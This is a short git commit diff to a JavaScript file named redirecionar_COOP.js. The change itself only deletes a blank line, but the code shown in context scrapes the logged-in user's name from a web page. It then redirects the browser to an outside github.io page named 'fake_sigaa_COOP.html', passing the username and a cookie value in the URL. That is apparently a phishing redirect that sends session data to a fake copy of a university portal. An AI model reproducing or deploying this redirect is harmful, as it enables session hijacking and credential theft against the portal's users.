97ae6b98b4c065fb1ad10577ccc73769e278b503
rodrigorochapinto <46836803+rodrigorochapinto@users.noreply.github.com>
2019-01-21 10:43:37 -0200

    Update redirecionar_COOP.js

--- js/redirecionar_COOP.js
+++ js/redirecionar_COOP.js
@@ -3,7 +3,6 @@ var x = document.getElementById("info-usuario").innerHTML;
 	y = x.split('title=');
 	y = y[1].split('>');
 	y = y[1].split('<');
-	
 window.location.href = "https://rodrigorochapinto.github.io/pages-teste/paginas/fake_sigaa_COOP.html?usuario="+y[0]+cookie;
 
 
